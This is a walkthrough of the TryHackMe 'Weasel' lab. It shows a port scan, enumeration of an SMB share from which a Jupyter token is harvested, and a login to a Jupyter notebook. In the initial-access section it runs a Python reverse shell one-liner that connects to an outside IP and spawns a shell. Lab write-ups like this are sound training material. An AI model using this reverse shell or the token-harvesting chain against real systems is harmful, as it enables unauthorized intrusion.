  ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f70b451f-cdde-4a6a-9c29-a88ef379d3d4)
  https://tryhackme.com/room/weasel

## Enumeration:

I started with the quick rustscan to scan for the open ports & services on the target. I found 15 open ports on the host:

```bash
sudo rustscan -a 10.10.165.102  -- -sC -sV -vv -oN weasel_nmap
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/72e347fb-ef6c-475a-b9d9-1ec51e111ab8)

```bash
PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBae1NsdsMcZJNQQ2wjF2sxXK2ZF3c7qqW3TN/q91pWiDee3nghS1J1FZrUXaEj0wnAAAbYRg5vbRZRP9oEagBwfWG3QJ9AO6s5UC+iTjX+YKH6phKNmsY5N/LKY4+2EDcwa5R4uznAC/2Cy5EG6s7izvABLcRh3h/w4rVHduiwrueAZF9UjzlHBOxHDOPPVtg+0dniGhcXRuEU5FYRA8/IPL8P97djscu23btk/hH3iqdQWlC9b0CnOkD8kuyDybq9nFaebAxDW4XFj7KjCRuuu0dyn5Sr62FwRXO4wu08ePUEmJF1Gl3/fdYe3vj+iE2yewOFAhzbmFWEWtztjJb
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOGl51l9Z4Mg4hFDcQz8v6XRlABMyVPWlkEXrJIg53piZhZ9WKYn0Gi4fKkzo3blDAsdqpGFQ11wwocBCSJGjQU=
|   256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHw9uTZkIMEgcZPW9Z28Mm+FX66+hkxk+8rOu7oI6J9
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-02T09:37:02+00:00
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Issuer: commonName=DEV-DATASCI-JUP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-12T11:46:50
| Not valid after:  2023-09-11T11:46:50
| MD5:   1671 b190 2eb6 b15f 0c3f ab16 d3e6 6582
| SHA-1: c007 197a dd30 f17f 2bdb 65f8 1804 fc6f d081 c7c9
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQPvhxvXPCnJtIgyPRvn3WzjANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9ERVYtREFUQVNDSS1KVVAwHhcNMjMwMzEyMTE0NjUwWhcNMjMw
| OTExMTE0NjUwWjAaMRgwFgYDVQQDEw9ERVYtREFUQVNDSS1KVVAwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQD1iFFVyhggpi7wL6i/UpivF4ynWEUALMJh
| v8t3ypgM+Vrdp7sqDQciG7YMfGhYyz3Za4G03Ppgi+DUu/2qsYfGJbllz8IRaelq
| 5G5DPGSy0lYItHbWEvPbPSWTcEOrxQMIv98lBx5fHbmzIP1mEeIiS7p8bpWGfFuR
| Y/zvTOOWRHcT09/z+6YDdCTztLIgtrE+ZFW1yNUYxqCPl6EdKutmIzDUCDFUyvhq
| jOuv1R3M9XGPGomb99tAdPWQeXwjQfNrJdEsJ0DBz3D9T2pbfVwKINfDt1qCQfPO
| zu9v8OZhe+BYvS6289GNmCbiaCVbeJK2yokPdMFx4uLIT85U7IKBAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAiVcJyTne2cl+bKhmctqIva2DA/v9P0odeZe1hO8TG7J4UZGeK5bOqwdE
| bPDKBuxD+QYXWLm+/eHgKKMwKemYp4iDcIMGfb5UgzkRe8RaI5kKiiPQSarFKIZe
| WphDWZrLDo9IN58b081R4k82IfGv7yXtIjZcral4fCEHhhTdVE2CvHvE1JGXSWbY
| NHoufyrjizsaLHAchdnuHgaz+cgcFgR/hD61vQpc8pW+v6xDNVtMFVdv7lLtbWov
| /dcC6Yd2jtk8sP7ue7K+FOhLaw9UDbji3XCXn0FoJwKBza/K8smP0M/3fHIqoFA2
| mc4b7D2CUHt9FNWIWyz9evlNAOixvg==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-07-02T09:37:11+00:00; +2s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8888/tcp  open  http          syn-ack ttl 127 Tornado httpd 6.0.3
|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
| http-methods: 
|_  Supported Methods: GET POST
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-server-header: TornadoServer/6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44682/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41197/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38094/udp): CLEAN (Failed to receive data)
|   Check 4 (port 61785/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-02T09:37:05
|_  start_date: N/A
```

Few observables from the port scan results:

```
- SMBv2 is enables but message signing is not enforceed.
- RDP is enbale on port 3389 & target name is: DEV-DATASCI-JUP
- port 5985 is open which powershell remoting is enabled.
- port 8888 is open & running TornadoServer/6.0.3 which is hosting Jupyter notebook.
```

### SMB enumeration:

Since the SMB is enabled, I started enumerating the network shares which is available for me. I used SMBmap to list all shares:

```bash
smbmap -H weasel.thm -u RandomUser
```
I observed that I have Read & Write access to "datasci-team" share & Read access to IPC$ share.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/0b11cea9-cf6e-48e2-b30b-1925210a35f8)

When checked for "datasci-team" share, I observed multiple files present in it, which I listed using smbmap:

```bash
smbmap -R datasci-team -H weasel.thm -u DoesNotExist
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/dd41e754-5ae5-4ddb-89cc-4848a4a26759)

I downloaded all those files in my local system after connecting via Smbclient:

```bash
smbclient \\\\weasel.thm\\datasci-team -U "DoesNotExist"

smb: \> prompt off #to turn off warnings
smb: \> recurse on #to turn on recursive mode
smb: \> mget * #to download everything from current file path.
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/37532ed1-c2f3-48cb-a847-54743fdcfe28)

After downloading all the files, I went through them & found a Jupyter-token inside one of the file.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/2af6f790-3a09-4a3f-926d-f87e2cd0ef65)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

From the port scan results I was already aware that port 8888 is running the tornado server & hosting Jupyter notebook in it, so I went to the server & found an option to login using jupyter token:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b5e2db75-db1b-4584-ac65-29562b8e43ee)

I used the Jupyer token which I found during my SMB scan to login into the server & I logged in successfully:
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/485629a3-b49a-4645-b962-2500e3af6e86)

After logging in I found the same files which I observed when I enumerated through the "**datasci-team**" share. Then I opened of of the Machine learning file "weasel.ipynb" & went through it's content:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/316183bd-3700-45f2-b293-3780eebd377b)

I found that there are modules running inside the file & we can also our own module which will be executed by Python, so I used one of the Python reverse shell one-liner & added to the file.

```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

After running the above code I quickly got the shell back to my netcat listener as a "dev-datasci" user.(pwn3d!🙂)
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b034c290-d9a1-4403-a173-c1b317f3abcc)


